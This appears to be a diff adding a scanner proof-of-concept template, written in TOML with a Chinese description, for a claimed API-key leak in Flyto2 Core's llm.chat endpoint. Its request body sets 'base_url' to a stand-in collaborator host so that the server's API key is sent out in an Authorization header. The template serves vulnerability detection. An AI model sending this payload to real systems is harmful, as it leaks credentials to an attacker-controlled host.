@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "检测 Flyto2 Core llm.chat 函数是否将环境变量中的 API 密钥通过 Authorization: Bearer 头发送到攻击者可控的 base_url 端点，绕过 SSRF 防护仅阻止内网地址"
+id = "POC-AVE-2026-0947"
+name = "Flyto2 Core LLM/API密钥泄露漏洞 PoC"
+severity = "high"
+tags = ["ave-2026-0947"]
+vuln_id = [
+    "CVE-2026-67425",
+    "AVE-2026-0947",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/llm/chat"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"model":"gpt-4","messages":[{"role":"user","content":"hello"}],"base_url":"http://example.com/collaborator"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "OPENAI_API_KEY",
+    "ANTHROPIC_API_KEY",
+    "Authorization",
+    "Bearer",
+    "api_key",
+    "API_KEY",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection refused",
+    "connection refused",
+    "timeout",
+    "ECONNREFUSED",
+    "ECONNRESET",
+]
